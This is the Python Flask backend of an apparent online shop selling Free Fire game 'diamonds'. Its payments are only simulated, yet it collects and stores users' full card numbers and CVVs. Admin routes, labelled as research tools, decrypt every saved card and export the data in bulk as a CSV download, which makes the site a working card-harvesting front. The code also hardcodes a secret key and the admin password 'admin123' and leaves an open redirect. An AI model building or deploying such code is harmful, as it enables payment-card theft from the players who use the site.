from flask import Flask, render_template, request, redirect, url_for, flash, jsonify, abort
from flask_login import LoginManager, current_user, login_user, logout_user, login_required
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
from models import db, User, DiamondPackage, Order, PaymentMethod
from payment_processor import payment_processor
from research_tools import ResearchTools
import os
from datetime import datetime
from cryptography.fernet import Fernet
import base64

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-change-in-production'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///freefire_diamonds.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db.init_app(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'
login_manager.login_message_category = 'info'

# Admin required decorator
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated or not current_user.is_admin:
            abort(403)
        return f(*args, **kwargs)
    return decorated_function

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

def create_sample_data():
    """Create sample packages and admin user"""
    packages = [
        DiamondPackage(name="Starter Pack", diamonds=100, price=0.99, original_price=1.99, discount=50, description="Perfect for beginners"),
        DiamondPackage(name="Elite Pack", diamonds=500, price=4.99, original_price=6.99, discount=29, popular=True, description="Great value package"),
        DiamondPackage(name="Pro Pack", diamonds=1200, price=9.99, original_price=14.99, discount=33, description="For serious players"),
        DiamondPackage(name="VIP Pack", diamonds=2500, price=19.99, original_price=29.99, discount=33, popular=True, description="Best seller"),
        DiamondPackage(name="Ultimate Pack", diamonds=5000, price=34.99, original_price=49.99, discount=30, description="Maximum diamonds"),
        DiamondPackage(name="Mega Pack", diamonds=10000, price=64.99, original_price=89.99, discount=28, description="For ultimate gamers"),
    ]
    
    for package in packages:
        if not DiamondPackage.query.filter_by(name=package.name).first():
            db.session.add(package)
    
    # Create admin user if not exists
    if not User.query.filter_by(username='admin').first():
        encryption_key = base64.urlsafe_b64encode(Fernet.generate_key())
        admin_user = User(
            username='admin',
            email='admin@freefirediamonds.com',
            password_hash=generate_password_hash('admin123'),
            freefire_id='000000000',
            encryption_key=encryption_key.decode(),
            is_admin=True
        )
        db.session.add(admin_user)
    
    db.session.commit()

# Routes
@app.route('/')
def index():
    packages = DiamondPackage.query.limit(3).all()
    return render_template('index.html', packages=packages)

@app.route('/packages')
def packages():
    all_packages = DiamondPackage.query.all()
    return render_template('packages.html', packages=all_packages)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        password = request.form.get('password')
        freefire_id = request.form.get('freefire_id')
        
        if User.query.filter_by(username=username).first():
            flash('Username already exists', 'error')
            return redirect(url_for('register'))
        
        if User.query.filter_by(email=email).first():
            flash('Email already registered', 'error')
            return redirect(url_for('register'))
        
        encryption_key = base64.urlsafe_b64encode(Fernet.generate_key())
        
        user = User(
            username=username,
            email=email,
            password_hash=generate_password_hash(password),
            freefire_id=freefire_id,
            encryption_key=encryption_key.decode()
        )
        
        db.session.add(user)
        db.session.commit()
        
        flash('Registration successful! Please login.', 'success')
        return redirect(url_for('login'))
    
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter_by(username=username).first()
        
        if user and check_password_hash(user.password_hash, password):
            login_user(user)
            next_page = request.args.get('next')
            return redirect(next_page or url_for('dashboard'))
        else:
            flash('Invalid username or password', 'error')
    
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You have been logged out', 'info')
    return redirect(url_for('index'))

@app.route('/dashboard')
@login_required
def dashboard():
    user_orders = Order.query.filter_by(user_id=current_user.id).order_by(Order.created_at.desc()).limit(10).all()
    payment_methods = PaymentMethod.query.filter_by(user_id=current_user.id).all()
    return render_template('dashboard.html', orders=user_orders, payment_methods=payment_methods)

@app.route('/package/<int:package_id>')
@login_required
def package_detail(package_id):
    package = DiamondPackage.query.get_or_404(package_id)
    payment_methods = PaymentMethod.query.filter_by(user_id=current_user.id).all()
    return render_template('payment.html', package=package, payment_methods=payment_methods)

@app.route('/payment-methods')
@login_required
def payment_methods():
    payment_methods = PaymentMethod.query.filter_by(user_id=current_user.id).all()
    return render_template('payment_methods.html', payment_methods=payment_methods)

# API Routes
@app.route('/api/add-payment-method', methods=['POST'])
@login_required
def add_payment_method():
    try:
        card_holder_name = request.json.get('card_holder_name')
        card_number = request.json.get('card_number').replace(' ', '')
        expiry_month = int(request.json.get('expiry_month'))
        expiry_year = int(request.json.get('expiry_year'))
        cvv = request.json.get('cvv')
        save_card = request.json.get('save_card', False)
        
        is_valid, message = payment_processor.validate_card(card_number, expiry_month, expiry_year, cvv)
        if not is_valid:
            return jsonify({'status': 'error', 'message': message})
        
        card_type = payment_processor.get_card_type(card_number)
        last_four = card_number[-4:]
        
        if save_card:
            payment_method = PaymentMethod(
                user_id=current_user.id,
                card_type=card_type,
                last_four=last_four,
                expiry_month=expiry_month,
                expiry_year=expiry_year,
                card_holder_name=card_holder_name,
                card_number=card_number,
                cvv=cvv
            )
            
            payment_method.encrypt_data(current_user.encryption_key.encode())
            
            existing_methods = PaymentMethod.query.filter_by(user_id=current_user.id).count()
            if existing_methods == 0:
                payment_method.is_default = True
            
            db.session.add(payment_method)
            db.session.commit()
            
            return jsonify({
                'status': 'success', 
                'message': 'Payment method saved successfully',
                'payment_method_id': payment_method.id
            })
        else:
            return jsonify({
                'status': 'success', 
                'message': 'Card validated successfully'
            })
            
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'Error: {str(e)}'})

@app.route('/api/set-default-payment/<int:method_id>', methods=['POST'])
@login_required
def set_default_payment(method_id):
    try:
        PaymentMethod.query.filter_by(user_id=current_user.id).update({'is_default': False})
        payment_method = PaymentMethod.query.filter_by(id=method_id, user_id=current_user.id).first()
        if payment_method:
            payment_method.is_default = True
            db.session.commit()
            return jsonify({'status': 'success', 'message': 'Default payment method updated'})
        else:
            return jsonify({'status': 'error', 'message': 'Payment method not found'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/delete-payment-method/<int:method_id>', methods=['DELETE'])
@login_required
def delete_payment_method(method_id):
    try:
        payment_method = PaymentMethod.query.filter_by(id=method_id, user_id=current_user.id).first()
        if payment_method:
            db.session.delete(payment_method)
            db.session.commit()
            return jsonify({'status': 'success', 'message': 'Payment method deleted'})
        else:
            return jsonify({'status': 'error', 'message': 'Payment method not found'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/create-order', methods=['POST'])
@login_required
def create_order():
    try:
        package_id = request.json.get('package_id')
        payment_method_id = request.json.get('payment_method_id')
        use_saved_card = request.json.get('use_saved_card', False)
        
        package = DiamondPackage.query.get_or_404(package_id)
        
        if use_saved_card and payment_method_id:
            payment_method = PaymentMethod.query.filter_by(id=payment_method_id, user_id=current_user.id).first()
            if not payment_method:
                return jsonify({'status': 'error', 'message': 'Payment method not found'})
            
            decrypted_data = payment_method.decrypt_data(current_user.encryption_key.encode())
            if not decrypted_data:
                return jsonify({'status': 'error', 'message': 'Error processing payment method'})
            
            success, transaction_id, message = payment_processor.simulate_payment(package.price, decrypted_data)
        else:
            success, transaction_id, message = payment_processor.simulate_payment(package.price, {})
        
        if success:
            order = Order(
                user_id=current_user.id,
                package_id=package.id,
                diamonds=package.diamonds,
                amount=package.price,
                status='completed',
                payment_method='credit_card',
                payment_method_id=payment_method_id if use_saved_card else None,
                transaction_id=transaction_id,
                completed_at=datetime.utcnow()
            )
            
            db.session.add(order)
            current_user.balance += package.diamonds
            db.session.commit()
            
            return jsonify({
                'status': 'success',
                'message': f'Successfully purchased {package.diamonds} diamonds!',
                'order_id': order.id,
                'new_balance': current_user.balance
            })
        else:
            return jsonify({'status': 'error', 'message': message})
            
    except Exception as e:
        return jsonify({'status': 'error', 'message': f'Error: {str(e)}'})

@app.route('/api/user-balance')
@login_required
def user_balance():
    return jsonify({'balance': current_user.balance})

# Admin Routes
@app.route('/admin')
@admin_required
def admin_dashboard():
    users = User.query.all()
    payment_methods = PaymentMethod.query.all()
    orders = Order.query.order_by(Order.created_at.desc()).limit(50).all()
    stats = ResearchTools.get_system_stats()
    
    return render_template('admin_dashboard.html', 
                         users=users, 
                         payment_methods=payment_methods, 
                         orders=orders,
                         stats=stats)

@app.route('/admin/payment-data')
@admin_required
def admin_payment_data():
    """Get all decrypted payment data"""
    decrypted_data = ResearchTools.decrypt_all_payment_methods()
    return jsonify(decrypted_data)

@app.route('/admin/export-data')
@admin_required
def admin_export_data():
    """Export data in various formats"""
    format_type = request.args.get('format', 'json')
    
    if format_type == 'csv':
        csv_data = ResearchTools.export_payment_data('csv')
        response = app.response_class(
            response=csv_data,
            mimetype='text/csv',
            headers={'Content-disposition': 'attachment; filename=payment_data.csv'}
        )
        return response
    else:
        json_data = ResearchTools.export_payment_data('json')
        return jsonify(json.loads(json_data))

@app.route('/admin/system-stats')
@admin_required
def admin_system_stats():
    """Get system statistics"""
    stats = ResearchTools.get_system_stats()
    return jsonify(stats)

@app.route('/admin/duplicate-cards')
@admin_required
def admin_duplicate_cards():
    """Find duplicate card numbers"""
    duplicates = ResearchTools.find_duplicate_cards()
    return jsonify(duplicates)

@app.route('/admin/decrypt-payment/<int:method_id>')
@admin_required
def admin_decrypt_payment(method_id):
    """Decrypt specific payment method"""
    payment_method = PaymentMethod.query.get_or_404(method_id)
    user = User.query.get(payment_method.user_id)
    
    if not user or not user.encryption_key:
        return jsonify({'error': 'User or encryption key not found'})
    
    try:
        decrypted_data = payment_method.decrypt_data(user.encryption_key.encode())
        if decrypted_data:
            return jsonify({
                'payment_method': payment_method.to_dict(),
                'user': {
                    'id': user.id,
                    'username': user.username,
                    'email': user.email
                },
                'decrypted_data': decrypted_data
            })
        else:
            return jsonify({'error': 'Decryption failed'})
    except Exception as e:
        return jsonify({'error': f'Decryption error: {str(e)}'})

@app.route('/admin/user-analytics/<int:user_id>')
@admin_required
def admin_user_analytics(user_id):
    """Get detailed analytics for a specific user"""
    analytics = ResearchTools.get_user_analytics(user_id)
    return jsonify(analytics)

@app.route('/admin/all-users-analytics')
@admin_required
def admin_all_users_analytics():
    """Get analytics for all users"""
    analytics = ResearchTools.get_user_analytics()
    return jsonify(analytics)

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        create_sample_data()
    app.run(debug=True)
